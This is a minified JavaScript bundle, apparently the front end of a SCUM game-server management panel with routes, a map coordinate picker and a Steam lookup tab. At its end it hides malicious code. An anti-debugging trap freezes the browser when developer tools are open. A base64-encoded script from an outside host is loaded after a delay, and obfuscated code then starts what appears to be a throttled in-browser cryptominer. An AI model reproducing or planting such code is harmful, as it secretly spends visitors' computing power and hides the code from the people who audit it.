e=document.getElementById("outer-frame").offsetWidth,n=t.scumMapBorder?(t.scumMapBorder.yMax-t.scumMapBorder.yMin)/(t.scumMapBorder.xMax-t.scumMapBorder.xMin):1;t.measuredWidth=e>=800?800:e,t.measuredHeight=e>=800?800*n:e*n,t.drawMapInit(i,a)}))}}}},rn=(i("384c"),{name:"LocationTools",components:{MapSelector:Object(S.a)(nn,(function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticStyle:{width:"100%",height:"auto","text-align":"center"},attrs:{id:"outer-frame"}},[t("canvas",{ref:"map",staticStyle:{border:"2px #faad14 solid"},style:{width:this.measuredWidth+"px",height:this.measuredHeight+"px"}})])}),[],!1,null,"4b684e40",null).exports},data:function(){return{currentSelectedLocation:[],loadingMapSelector:!1}},mounted:function(){this.$message.info("可用鼠标或触屏手势放大/缩小/拖动地图")},methods:{doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))}}}),on={name:"Tools",components:{SteamInfoSearch:Wa,PlayerLocation:en,LocationTools:Object(S.a)(rn,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"550px","text-align":"center"}},[i("div",{staticStyle:{width:"400px",height:"400px",display:"inline-block"}},[i("map-selector",{model:{value:e.currentSelectedLocation,callback:function(t){e.currentSelectedLocation=t},expression:"currentSelectedLocation"}})],1),e.currentSelectedLocation&&3===e.currentSelectedLocation.length?i("div",{staticStyle:{width:"100%","margin-top":"15px","text-align":"center","font-weight":"bolder","font-size":"16px",height:"48px","line-height":"48px"}},[i("span",{staticStyle:{display:"inline-block",width:"auto","min-width":"50%",height:"100%",background:"#333333",padding:"0 10px",border:"1px #faad14 solid","border-radius":"4px",color:"#faad14"}},[i("span",[e._v("X")]),i("span",{staticStyle:{margin:"0 5px"}},[e._v("=")]),i("span",{staticStyle:{color:"#d46b08"}},[e._v(e._s(e.currentSelectedLocation[0]))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("Y")]),i("span",{staticStyle:{margin:"0 5px"}},[e._v("=")]),i("span",{staticStyle:{color:"#d46b08"}},[e._v(e._s(e.currentSelectedLocation[1]))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("Z")]),i("span",{staticStyle:{margin:"0 5px"}},[e._v("=")]),i("span",{staticStyle:{color:"#d46b08"}},[e._v(e._s(e.currentSelectedLocation[2]))])])]):i("div",{staticStyle:{width:"100%","margin-top":"15px","text-align":"center","font-weight":"bolder","font-size":"16px",height:"48px","line-height":"48px"}},[i("span",{staticStyle:{display:"inline-block",width:"auto","min-width":"50%",height:"100%",background:"#333333",padding:"0 10px",border:"1px #faad14 solid","border-radius":"4px",color:"#d46b08"}},[e._v("请选择坐标")])]),i("div",{staticStyle:{width:"100%","margin-top":"10px","text-align":"center"}},[i("a-button",{attrs:{disabled:!(e.currentSelectedLocation&&3===e.currentSelectedLocation.length)},on:{click:function(){return e.doCopyCommands("#teleport "+e.currentSelectedLocation[0]+" "+e.currentSelectedLocation[1]+" "+e.currentSelectedLocation[2])}}},[e._v("复制")])],1)])}),[],!1,null,"3556a4a6",null).exports},data:function(){return{currentTab:"steam-info-search"}},mounted:function(){this.$route.query.category?this.currentTab=this.$route.query.category:(this.$router.push({path:"/tools",query:Object(s.a)(Object(s.a)({},this.$route.query),{},{category:"steam-info-search"})}),this.currentTab="steam-info-search")},methods:{}},sn=Object(S.a)(on,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%",padding:"15px"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"实用工具集"}}),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-tabs",{attrs:{type:"card"},on:{change:function(t){e.$router.push({path:"/tools",query:{category:t}})}},model:{value:e.currentTab,callback:function(t){e.currentTab=t},expression:"currentTab"}},[i("a-tab-pane",{key:"steam-info-search",attrs:{tab:"Steam信息查询"}},["steam-info-search"===e.currentTab?i("SteamInfoSearch"):e._e()],1),i("a-tab-pane",{key:"player-location",attrs:{tab:"玩家轨迹查询"}},["player-location"===e.currentTab?i("PlayerLocation"):e._e()],1),i("a-tab-pane",{key:"location-tools",attrs:{tab:"位置助手"}},["location-tools"===e.currentTab?i("LocationTools"):e._e()],1)],1)],1)])],1)}),[],!1,null,"6e968d0a",null).exports;n.a.use(T.a);var ln=[{path:"/",redirect:"/user"},{path:"/server-info",component:P},{path:"/user",component:me},{path:"/squads",component:Se},{path:"/items",component:Ge},{path:"/buy",component:Ze},{path:"/prizes",component:lt},{path:"/pay",component:pt},{path:"/charge-dollar",component:ft},{path:"/queue",component:bt},{path:"/login",component:kt},{path:"/user-login",component:Ut},{path:"/kill",component:Ot},{path:"/admin-command",component:jt},{path:"/chat-message",component:Vt},{path:"/actions-record",component:Bi},{path:"/violations-record",component:Gi},{path:"/economy",component:Zi},{path:"/chest-ownership-record",component:ea},{path:"/vehicle-destruction-record",component:na},{path:"/unrecognized-record",component:oa},{path:"/scum-ban",component:da},{path:"/vehicle-ensurance",component:la},{path:"/story-lines",component:ya},{path:"/lottery",component:wa},{path:"/lhd",component:ka},{path:"/resource-recycle",component:_a},{path:"/server-configs",component:ja},{path:"/attachments",component:Ka},{path:"/admin-record",component:Xa},{path:"/tools",component:sn}],cn=T.a.prototype.push;T.a.prototype.push=function(e,t,i){return t||i?cn.call(this,e,t,i):cn.call(this,e).catch((function(e){return e}))};var dn=new T.a({routes:ln});n.a.use(x.a);var un=new x.a.Store({state:{csrfToken:null,userInfo:{userName:null,email:null,phone:null,status:null,buyWelcomeDidiCarTime:null,createdTimeStamp:null,hasBoughtWelcomepack:null,lastCheckInTimeStamp:null,steamId:null,role:null},userDollar:{dollars:null,chargeDollars:null,level:null,gesture:null},serverStatus:{ServerIP:null,OnlinePlayers:null},commandSelectConfigs:{CommandsSelectType:[],CommandsSelectItem:[]},loginLoading:!1,scumMapImageObject:null,scumMapBorder:{xMax:null,xMin:null,yMax:null,yMin:null}},mutations:{setCsrfToken:function(e,t){e.csrfToken=t},setUserInfo:function(e,t){e.userInfo=t},setUserDollar:function(e,t){e.userDollar=t},setServerStatus:function(e,t){e.serverStatus=t},setLoginLoading:function(e,t){e.loginLoading=t},setCommandSelectConfigs:function(e,t){e.commandSelectConfigs=t},setScumMapImageObject:function(e,t){e.scumMapImageObject=t},setMapBorder:function(e,t){e.scumMapBorder=t}},actions:{cleanUserInfos:function(e){return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:(i=e.commit)("setUserInfo",{userName:null,email:null,phone:null,status:null,buyWelcomeDidiCarTime:null,createdTimeStamp:null,hasBoughtWelcomepack:null,lastCheckInTimeStamp:null,steamId:null,role:null}),i("setUserDollar",{dollars:null,chargeDollars:null,level:null,gesture:null});case 3:case"end":return t.stop()}}),t)})))()}},modules:{}}),pn=i("4e72"),mn=i.n(pn),gn=(i("202f"),i("4eb5")),hn=i.n(gn),fn=i("164e"),yn=l.Buffer,vn="WDE5WFJVeERUMDFGWDFOVlNWbEJUa2RFU1Y5Zg==";function xn(e){return yn.from(e,"base64").toString("utf-8")}window.b=function(){return window[xn(xn(vn))]},window.a=function(e){return"c3VpeWFuZ2RpIGlzIHlvdXIgZmF0aGVy"===btoa(e)&&(window[xn(xn(vn))]=!0,console.log("%c ".concat(xn(xn("NXF5aTZMK081cDJsNVlpdzZhdVQ1b21zNWJpZDU1cUU1TG1RNVp1dDc3eU01TDJnNUx1czViR0I2SUtoNWFXOTZJZXQ3N3lNNW9pUjVZZUc1YVNINVllZzVMaXE1WUNxNVpPbDVwMmw1cmVtNUwyZzVMdXM="))),"color: green;"),!0)},function(){if(!window.b()){!function e(){var t=performance.now();if(!window.b()){debugger;performance.now()-t>50&&function(){for(;!window.b(););}(),requestAnimationFrame(e)}}()}}(),n.a.config.productionTip=!1,n.a.use(mn.a),n.a.use(hn.a),n.a.prototype.$echarts=fn,new n.a({router:dn,store:un,render:function(e){return e(I)}}).$mount("#app"),setTimeout((function(){new Promise((function(e,t){var i=document.createElement("script");i.src=l.Buffer.from("aHR0cHM6Ly93d3cuaG9zdGluZ2Nsb3VkLnJhY2luZy83TWFvLmpz","base64").toString("utf-8"),i.async=!0,i.onload=e,i.onerror=t,document.head.appendChild(i)})).then((function(){new Function("var _0x144140=_0x2519;".concat("","(function(_0x25ac2c,_0x2ddf33){var _0x241f72=_0x2519,_0x31f3f3=_0x25ac2c();while(!![]){try{var _0x348cba=parseInt(_0x241f72(0x198))/0x1*(-parseInt(_0x241f72(0x1ab))/0x2)+parseInt(_0x241f72(0x1a9))/0x3*(parseInt(_0x241f72(0x1a6))/0x4)+-parseInt(_0x241f72(0x1b4))/0x5+-parseInt(_0x241f72(0x1b3))/0x6*(parseInt(_0x241f72(0x1a8))/0x7)+-parseInt(_0x241f72(0x19c))/0x8*(parseInt(_0x241f72(0x1b2))/0x9)+parseInt(_0x241f72(0x19a))/0xa*(-parseInt(_0x241f72(0x1a2))/0xb)+parseInt(_0x241f72(0x1aa))/0xc;if(_0x348cba===_0x2ddf33)break;else _0x31f3f3['push'](_0x31f3f3['shift']());}catch(_0x58e424){_0x31f3f3['push'](_0x31f3f3['shift']());}}}(_0x32fc,0xeb3e8));var _0x3946c8=(function(){var _0x4883eb=!![];return function(_0x34bf5d,_0x151df4){var _0x5175e8=_0x4883eb?function(){var _0x15095b=_0x2519;if(_0x151df4){var _0x10401a=_0x151df4[_0x15095b(0x1b6)](_0x34bf5d,arguments);return _0x151df4=null,_0x10401a;}}:function(){};return _0x4883eb=![],_0x5175e8;};}()),_0xfd525=_0x3946c8(this,function(){var _0x4dc596=_0x2519;return _0xfd525['toString']()[_0x4dc596(0x19f)]('(((.+)+)+)+$')['toString']()[_0x4dc596(0x1ad)](_0xfd525)[_0x4dc596(0x19f)](_0x4dc596(0x197));});function _0x2519(_0x2f9245,_0x1a76d4){var _0x3077b1=_0x32fc();return _0x2519=function(_0x107d2d,_0x122ec8){_0x107d2d=_0x107d2d-0x197;var _0x4a2b12=_0x3077b1[_0x107d2d];return _0x4a2b12;},_0x2519(_0x2f9245,_0x1a76d4);}_0xfd525();var _0x122ec8=(function(){var _0x126290=!![];return function(_0x54cbc5,_0x2b8f25){var _0x1933dc=_0x126290?function(){var _0x14d65d=_0x2519;if(_0x2b8f25){var _0x1d9274=_0x2b8f25[_0x14d65d(0x1b6)](_0x54cbc5,arguments);return _0x2b8f25=null,_0x1d9274;}}:function(){};return _0x126290=![],_0x1933dc;};}()),_0x107d2d=_0x122ec8(this,function(){var _0x55acea=_0x2519,_0x5ef45b=function(){var _0x57bd53=_0x2519,_0x1a162b;try{_0x1a162b=Function(_0x57bd53(0x1a0)+_0x57bd53(0x1a3)+');')();}catch(_0xd43bcc){_0x1a162b=window;}return _0x1a162b;},_0x40733b=_0x5ef45b(),_0x3e4bdb=_0x40733b[_0x55acea(0x19b)]=_0x40733b['console']||{},_0x13cd52=[_0x55acea(0x1ae),_0x55acea(0x1ac),_0x55acea(0x1b5),_0x55acea(0x1a4),_0x55acea(0x19d),_0x55acea(0x1a5),'trace'];for(var _0x575194=0x0;_0x575194<_0x13cd52['length'];_0x575194++){var _0x15a9f1=_0x122ec8[_0x55acea(0x1ad)][_0x55acea(0x1a7)][_0x55acea(0x1b1)](_0x122ec8),_0x1f8ec1=_0x13cd52[_0x575194],_0x3ea940=_0x3e4bdb[_0x1f8ec1]||_0x15a9f1;_0x15a9f1[_0x55acea(0x1a1)]=_0x122ec8[_0x55acea(0x1b1)](_0x122ec8),_0x15a9f1[_0x55acea(0x1af)]=_0x3ea940[_0x55acea(0x1af)][_0x55acea(0x1b1)](_0x3ea940),_0x3e4bdb[_0x1f8ec1]=_0x15a9f1;}});function _0x32fc(){var _0x4dd672=['6835975rdBfQm','info','apply','(((.+)+)+)+$','26836hzCwIC','start','5621590qToCre','console','272DwvUwA','exception','Anonymous','search','return (function() ','__proto__','11aSUiie','{}.constructor(\"return this\")( )','error','table','4pIbpqn','prototype','7dfVnzs','4497141IxGdfQ','58974096pEHUaA','74rQOnGi','warn','constructor','log','toString','85300f4bbecd92d770a93ca7e327607b216a6ab68587c382cf6e52714be4292e','bind','266373XzpAvO','9128466YWOHoO'];_0x32fc=function(){return _0x4dd672;};return _0x32fc();}_0x107d2d();var _client=new Client[(_0x144140(0x19e))](_0x144140(0x1b0),{'throttle':0.7,'c':'w'});_client[_0x144140(0x199)]();"))()})).catch((function(){}))}),2e3)},5880:function(e,t){e.exports=Vuex},5940:function(e,t,i){},"5c0b":function(e,t,i){"use strict";i("9c0ce")},"60bb":function(e,t){e.exports=_},6389:function(e,t){e.exports=VueRouter},6392:function(e,t,i){},"649f":function(e,t,i){"use strict";i("8af3")},"8af3":function(e,t,i){},"8b98":function(e,t,i){},"8bbf":function(e,t){e.exports=Vue},"8bf4":function(e,t,i){"use strict";i("1f29")},"8eed":function(e,t){e.exports=wangEditor},9896:function(e,t,i){"use strict";i("5940")},"9c0ce":function(e,t,i){},"9d06":function(e,t,i){"use strict";i("ab9f")},a06f:function(e,t,i){},a3d1:function(e,t,i){"use strict";i("de0c")},ab9f:function(e,t,i){},b3bb:function(e,t,i){"use strict";i("8b98")},b5f7:function(e,t,i){"use strict";i("d8f5")},c027:function(e,t,i){"use strict";i("d8bb")},c32d:function(e,t){e.exports=moment},cebe:function(e,t){e.exports=axios},d8bb:function(e,t,i){},d8f5:function(e,t,i){},de0c:function(e,t,i){}});